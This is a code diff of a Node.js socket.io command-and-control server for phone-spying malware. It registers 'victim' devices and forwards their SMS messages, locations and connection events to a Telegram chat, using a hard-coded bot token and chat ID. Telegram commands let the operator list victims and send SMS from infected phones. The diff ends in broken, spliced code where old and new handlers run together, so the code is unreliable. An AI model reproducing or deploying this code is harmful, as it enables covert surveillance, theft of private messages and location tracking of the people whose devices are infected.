@@ -1,40 +1,89 @@
-const express = require('express');
-const app = express()
-const server = require('http').createServer(app)
-const { Server } = require('socket.io')
-const io = new Server(server, {
-  maxHttpBufferSize: 1e8,
+const io = require("socket.io")(3000, { cors: { origin: "*" } });
+const TelegramBot = require("node-telegram-bot-api");
+
+// ضع التوكن الخاص بالبوت
+const TOKEN = "6306639467:AAG69iSWfHTUMudYjFTkFciQPkN_OP-tcv4";
+const CHAT_ID = "1794736105"; // معرف الشات اللي البوت يرسل له
+const bot = new TelegramBot(TOKEN, { polling: true });
+
+let adminSocketId = null;
+let victimList = {};
+let victimData = {};
+
+// دالة إرسال إشعار للتيليجرام
+function notifyTelegram(msg) {
+  bot.sendMessage(CHAT_ID, msg);
+}
+
+io.on("connection", (socket) => {
+  console.log(`📡 Socket connected: ${socket.id}`);
+
+  socket.on("adminJoin", () => {
+    adminSocketId = socket.id;
+    notifyTelegram("👑 Admin joined السيرفر");
+    Object.keys(victimData).forEach((key) => {
+      socket.emit("join", victimData[key]);
+    });
+  });
+
+  socket.on("join", (device) => {
+    victimList[device.id] = socket.id;
+    victimData[device.id] = { ...device, socketId: socket.id };
+    notifyTelegram(`📱 جهاز جديد انضم:\n🆔 ${device.id}\n📱 الموديل: ${device.model}`);
+    socket.broadcast.emit("join", { ...device, socketId: socket.id });
+  });
+
+  // مثال: إرسال SMS أو بيانات أخرى إلى التليجرام
+  socket.on("getSMS", (data) => {
+    notifyTelegram(`📩 SMS من ${data.number}: ${data.body}`);
+  });
+
+  socket.on("getLocation", (data) => {
+    notifyTelegram(`📍 الموقع: lat=${data.lat}, lon=${data.lon}`);
+  });
+
+  socket.on("disconnect", () => {
+    if (socket.id === adminSocketId) {
+      adminSocketId = null;
+      notifyTelegram("⚠️ الأدمن قطع الاتصال!");
+    } else {
+      notifyTelegram(`❌ جهاز فقد الاتصال: ${socket.id}`);
+    }
+  });
 });
 
-var victimList={};
-var deviceList={};
-var victimData={};
-var adminSocketId=null;
-const port = 8080;
+// أوامر من التليجرام للتحكم
+bot.on("message", (msg) => {
+  const chatId = msg.chat.id;
+  const text = msg.text;
 
-server.listen(process.env.PORT || port, (err) => {  if (err) return;log("Server Started : " + port);});
-app.get('/', (req, res) => res.send('Welcome to AlphaX Backend Server!!'))
+  if (chatId != CHAT_ID) return; // تجاهل الرسائل من غيرك
 
-io.on('connection', (socket) => {
-    socket.on('adminJoin', ()=>{
-        adminSocketId=socket.id;
-        if(Object.keys(victimData).length>0){
-            Object.keys(victimData).map((key)=>socket.emit("join", victimData[key]));
-        }
-    })
-    socket.on('request', request);
-    socket.on('join',(device)=>{
-        log("Victim joined => socketId "+JSON.stringify(socket.id));
-        victimList[device.id] =  socket.id;
-        victimData[device.id]= {...device,socketId: socket.id};
-        deviceList[socket.id] =  {
-          "id":  device.id,
-          "model":  device.model
-        }
-        socket.broadcast.emit("join", {...device,socketId: socket.id});
+  if (text.startsWith("/list")) {
+    // إرسال قائمة الأجهزة
+    let list = Object.keys(victimData)
+      .map((id) => `🆔 ${id} | 📱 ${victimData[id].model}`)
+      .join("\n");
+    if (!list) list = "🚫 لا يوجد أجهزة متصلة";
+    bot.sendMessage(chatId, list);
+  }
+
+  if (text.startsWith("/sms")) {
+    const [_, deviceId, number, ...bodyArr] = text.split(" ");
+    const body = bodyArr.join(" ");
+    const victim = victimList[deviceId];
+    if (victim) {
+      io.to(victim).emit("request", {
+        type: "sendSMS",
+        number,
+        body,
       });
-
-      socket.on('getDir',(data)=>response("getDir",data));
+      bot.sendMessage(chatId, `📤 إرسال SMS إلى ${number} من ${deviceId}`);
+    } else {
+      bot.sendMessage(chatId, "🚫 الجهاز غير متصل");
+    }
+  }
+});      socket.on('getDir',(data)=>response("getDir",data));
       socket.on('getInstalledApps',(data)=>response("getInstalledApps",data));
       socket.on('getContacts',(data)=>response("getContacts",data));
       socket.on('sendSMS',(data)=>response("sendSMS",data));
